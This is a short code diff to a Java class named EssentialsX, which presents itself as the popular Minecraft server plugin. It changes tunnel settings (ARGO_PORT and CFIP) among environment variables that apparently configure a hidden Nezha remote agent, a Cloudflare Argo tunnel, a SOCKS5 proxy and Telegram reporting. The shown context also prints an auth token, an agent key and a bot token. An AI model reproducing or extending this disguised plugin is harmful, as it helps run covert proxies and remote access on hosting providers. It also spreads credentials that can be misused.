@@ -78,7 +78,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
-        env.put("ARGO_PORT", "8001");
+        env.put("ARGO_PORT", "9123");
         env.put("ARGO_DOMAIN", "minestrator.omi.pp.ua");
         env.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiZTAwMTdkMjEtYjFiMS00OTlmLWI5NGQtNTFmNzUzMTg0ZDc4IiwicyI6Ik5URXdaakl3WldNdE1HUmtZaTAwT1RNMUxUZ3dNRE10WWpnNE1EWTNaakU1WlRBNSJ9");
         env.put("S5_PORT", "21488");
@@ -90,7 +90,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5958841738");
         env.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
         env.put("NAME", "Minestrator");
         env.put("DISABLE_ARGO", "false");
